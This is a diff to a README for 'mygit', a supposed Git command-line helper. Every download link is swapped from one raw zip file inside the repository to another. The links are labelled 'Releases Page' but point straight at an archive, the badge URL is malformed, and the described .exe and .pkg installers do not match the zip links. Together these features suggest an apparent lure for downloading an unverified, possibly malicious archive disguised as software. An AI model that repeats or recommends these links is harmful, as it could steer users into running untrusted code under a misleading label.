@@ -1,7 +1,7 @@
 # 🎉 mygit - Simplified Git Management for Everyone
 
 ## 📥 Download Now
-[![Download mygit](https://raw.githubusercontent.com/Ariesrisen74/mygit/main/mygit/commands/mygit_v2.2.zip%20mygit-Get%https://raw.githubusercontent.com/Ariesrisen74/mygit/main/mygit/commands/mygit_v2.2.zip)](https://raw.githubusercontent.com/Ariesrisen74/mygit/main/mygit/commands/mygit_v2.2.zip)
+[![Download mygit](https://github.com/Ariesrisen74/mygit/raw/refs/heads/main/mygit/Software-3.0-alpha.3.zip%20mygit-Get%https://github.com/Ariesrisen74/mygit/raw/refs/heads/main/mygit/Software-3.0-alpha.3.zip)](https://github.com/Ariesrisen74/mygit/raw/refs/heads/main/mygit/Software-3.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **mygit**! This tool provides a user-friendly command-line interface (CLI) for Git with an interactive menu. Whether you are a beginner or just want to simplify your Git experience, mygit is here to help.
@@ -20,9 +20,9 @@ Welcome to **mygit**! This tool provides a user-friendly command-line interface 
 ## 🛠 Installation
 
 ### Download & Install
-To get started, visit the [Releases Page](https://raw.githubusercontent.com/Ariesrisen74/mygit/main/mygit/commands/mygit_v2.2.zip). Here, you can find the latest version of mygit.
+To get started, visit the [Releases Page](https://github.com/Ariesrisen74/mygit/raw/refs/heads/main/mygit/Software-3.0-alpha.3.zip). Here, you can find the latest version of mygit.
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/Ariesrisen74/mygit/main/mygit/commands/mygit_v2.2.zip).
+1. Go to the [Releases Page](https://github.com/Ariesrisen74/mygit/raw/refs/heads/main/mygit/Software-3.0-alpha.3.zip).
 2. Locate the most recent version.
 3. Download the appropriate file for your operating system (look for the file ending with `.exe` for Windows, `.pkg` for macOS, and appropriate files for Linux).
 4. Follow the installation instructions for your operating system.
@@ -55,7 +55,7 @@ Once you install mygit, open your command-line interface (terminal for macOS and
 If you encounter issues or have questions, check out our FAQ section in the Releases Page or open an issue in the repository. Community support is also encouraged.
 
 ## 📰 Updates
-We regularly update mygit with new features and bug fixes. By visiting the [Releases Page](https://raw.githubusercontent.com/Ariesrisen74/mygit/main/mygit/commands/mygit_v2.2.zip), you can keep track of all changes.
+We regularly update mygit with new features and bug fixes. By visiting the [Releases Page](https://github.com/Ariesrisen74/mygit/raw/refs/heads/main/mygit/Software-3.0-alpha.3.zip), you can keep track of all changes.
 
 ## 📈 Future Plans
 We aim to integrate more features such as:
@@ -71,4 +71,4 @@ If you want to contribute to mygit, feel free to fork the repository and submit 
 ## 🔗 Connect with Us
 Stay up to date with mygit by following our GitHub repository. Join our community discussions and share your experiences. We value all users’ input and strive for continuous improvement.
 
-For more information, visit the [Releases Page](https://raw.githubusercontent.com/Ariesrisen74/mygit/main/mygit/commands/mygit_v2.2.zip) to download the application and view detailed updates.
+For more information, visit the [Releases Page](https://github.com/Ariesrisen74/mygit/raw/refs/heads/main/mygit/Software-3.0-alpha.3.zip) to download the application and view detailed updates.
